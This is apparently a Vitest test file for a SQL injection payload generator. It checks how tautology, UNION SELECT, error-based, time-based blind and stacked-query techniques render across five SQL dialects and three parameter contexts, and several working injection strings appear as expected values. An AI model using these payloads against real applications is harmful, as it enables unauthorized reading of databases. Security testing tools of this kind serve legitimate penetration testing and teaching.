import { describe, expect, it } from "vitest";
import { SQL_DIALECTS_BY_ID } from "./dialects";
import { SQLI_TECHNIQUES_BY_ID } from "./techniques";

const QUOTE = "'";

describe("tautology", () => {
  const technique = SQLI_TECHNIQUES_BY_ID["tautology"];

  it("never touches a quote in numeric context", () => {
    const payload = technique.render(SQL_DIALECTS_BY_ID.mysql, null, QUOTE, "numeric", 1);
    expect(payload).toBe(" OR 1=1-- ");
  });

  it("breaks out of a string parameter", () => {
    const payload = technique.render(SQL_DIALECTS_BY_ID.mysql, null, QUOTE, "string", 1);
    expect(payload).toBe("' OR '1'='1'-- ");
  });

  it("closes the LIKE wildcard first in search context", () => {
    const payload = technique.render(SQL_DIALECTS_BY_ID.mysql, null, QUOTE, "search", 1);
    expect(payload).toBe("%' OR '1'='1'-- ");
  });

  it("is available on every dialect", () => {
    for (const dialect of Object.values(SQL_DIALECTS_BY_ID)) {
      expect(technique.render(dialect, null, QUOTE, "string", 1)).not.toBeNull();
    }
  });
});

describe("union-select", () => {
  const technique = SQLI_TECHNIQUES_BY_ID["union-select"];

  it("returns null when there's no info to extract", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.mysql, null, QUOTE, "string", 1)).toBeNull();
  });

  it("pads with NULL columns to match the requested column count", () => {
    const payload = technique.render(SQL_DIALECTS_BY_ID.mysql, "@@version", QUOTE, "string", 3);
    expect(payload).toBe("' UNION SELECT NULL,NULL,@@version-- ");
  });

  it("emits a single-column select when columnCount is 1", () => {
    const payload = technique.render(SQL_DIALECTS_BY_ID.mysql, "@@version", QUOTE, "string", 1);
    expect(payload).toBe("' UNION SELECT @@version-- ");
  });
});

describe("error-based", () => {
  const technique = SQLI_TECHNIQUES_BY_ID["error-based"];

  it("is unsupported on dialects with no errorTrigger (Oracle, SQLite)", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.oracle, "expr", QUOTE, "string", 1)).toBeNull();
    expect(technique.render(SQL_DIALECTS_BY_ID.sqlite, "expr", QUOTE, "string", 1)).toBeNull();
  });

  it("embeds the dialect's error trigger on MySQL/MSSQL/PostgreSQL", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.mysql, "expr", QUOTE, "string", 1)).toContain("EXTRACTVALUE");
    expect(technique.render(SQL_DIALECTS_BY_ID.mssql, "expr", QUOTE, "string", 1)).toContain("CONVERT");
    expect(technique.render(SQL_DIALECTS_BY_ID.postgresql, "expr", QUOTE, "string", 1)).toContain("CAST");
  });
});

describe("time-based-blind", () => {
  const technique = SQLI_TECHNIQUES_BY_ID["time-based-blind"];

  it("is unsupported on MSSQL, Oracle, and SQLite (no inline sleep condition)", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.mssql, null, QUOTE, "string", 1)).toBeNull();
    expect(technique.render(SQL_DIALECTS_BY_ID.oracle, null, QUOTE, "string", 1)).toBeNull();
    expect(technique.render(SQL_DIALECTS_BY_ID.sqlite, null, QUOTE, "string", 1)).toBeNull();
  });

  it("is supported on MySQL and PostgreSQL", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.mysql, null, QUOTE, "string", 1)).toContain("SLEEP");
    expect(technique.render(SQL_DIALECTS_BY_ID.postgresql, null, QUOTE, "string", 1)).toContain("PG_SLEEP");
  });
});

describe("stacked-queries", () => {
  const technique = SQLI_TECHNIQUES_BY_ID["stacked-queries"];

  it("is unsupported on Oracle (needs a PL/SQL block) and SQLite (no sleep primitive)", () => {
    expect(technique.render(SQL_DIALECTS_BY_ID.oracle, null, QUOTE, "string", 1)).toBeNull();
    expect(technique.render(SQL_DIALECTS_BY_ID.sqlite, null, QUOTE, "string", 1)).toBeNull();
  });

  it("is supported on MySQL, MSSQL, and PostgreSQL", () => {
    for (const id of ["mysql", "mssql", "postgresql"] as const) {
      expect(technique.render(SQL_DIALECTS_BY_ID[id], null, QUOTE, "string", 1)).not.toBeNull();
    }
  });
});
